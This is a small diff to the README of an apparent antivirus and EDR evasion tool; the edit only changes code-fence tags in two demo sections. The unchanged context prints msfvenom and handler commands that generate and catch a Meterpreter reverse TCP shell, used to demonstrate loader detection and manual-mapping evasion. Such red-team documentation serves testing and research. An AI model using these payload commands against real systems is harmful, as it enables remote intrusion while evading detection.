@@ -295,7 +295,7 @@ repository. Frida will install a hook on `NtCreateThreadEx`, and Inceptor will t
 
 ### Demo 2.1: we get caught!
 
-```sh-session
+```
 # Console 1: Start Metasploit
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f raw -o msf.raw
 handler -H eth0 -P 4444 -p windows/x64/meterpreter/reverse_tcp
@@ -318,7 +318,7 @@ NtCreateThreadEx performed by the loader:
 
 ### Demo 2.2: Ok, now with manual mapping!
 
-```sh-session
+```
 # Console 1: Start Metasploit
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f raw -o msf.raw
 handler -H eth0 -P 4444 -p windows/x64/meterpreter/reverse_tcp
